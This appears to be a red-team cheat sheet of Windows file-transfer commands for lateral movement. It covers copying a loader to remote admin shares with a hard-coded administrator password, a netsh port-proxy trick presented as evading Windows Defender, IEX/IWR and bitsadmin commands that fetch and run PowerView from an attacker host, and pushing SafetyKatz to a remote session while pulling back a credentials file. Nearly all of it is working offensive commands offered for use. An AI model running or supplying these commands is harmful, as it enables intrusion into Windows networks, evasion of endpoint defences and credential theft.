
## Basic File Transfer
```cmd
echo F | xcopy C:\AD\Tools\Loader.exe \\usweb\C$\Users\Public\Loader.exe /Y
```
## Net use

**Upload files to remote computer by mapping remote folder to our drive X on our machine:**
```cmd
net use x: \\server1\C$\Users\Public /user:server1\Administrator Password123!
```

**Copy desired file to the remote machine:**
```cmd
echo Y | xcopy C:\Loader.exe x:\Loader.exe
```

**Remove the mapping:**
```cmd
net use x: /d
```

> ⚠️ **PAY ATTENTION:**
> Check if non-admin can mount it.
---
## Bypass behaviour detection when downloading a file

> ⚠️ **PAY ATTENTION:**
> Needs admin privileges.

**Forwards anything sent to port 8080 to any IP in the local machine to port 80 on our machine:**

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.131
```

>**ℹ️ Info:**
>Since the download is "happening" on localhost, we bypass behaviour detection from Windows Defender.

**Removing the port forward:**
```cmd
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```
---
## Rejetto HFS
https://github.com/rejetto/hfs/releases/download/v0.56.0/hfs-windows-x64-0.56.0.zip

**Normal file download:**
```powershell
IEX(IWR -usebasicparsing http://192.168.1.131/PowerView.ps1 -outfile PowerView.ps1)
```

**Behaviour detection bypass download:**
```powershell
IEX(IWR -usebasicparsing http://127.0.0.1:8080/PowerView.ps1 -outfile PowerView.ps1)
```
---

## BITS Jobs

**Normal file download:**
```powershell
bitsadmin /transfer myjob /download /priority high http://192.168.1.131/PowerView.ps1 c:\temp\PowerView.ps1
```

**Behaviour detection bypass download:**
```powershell
bitsadmin /transfer myjob /download /priority high http://127.0.0.1:8080/PowerView.ps1 c:\temp\PowerView.ps1
```

## PowerShell Remoting

**Copy item to PSSession:**
```powershell
Copy-Item -ToSession $sess -Path "C:\Tools\SafetyKatz.exe" -Destination "C:\Users\Public\" -verbose
```

**Copy item from PSSession**

```powershell
Copy-Item -FromSession $sess -Path "C:\Logs\creds.txt" -Destination "C:\AD\" -verbose
```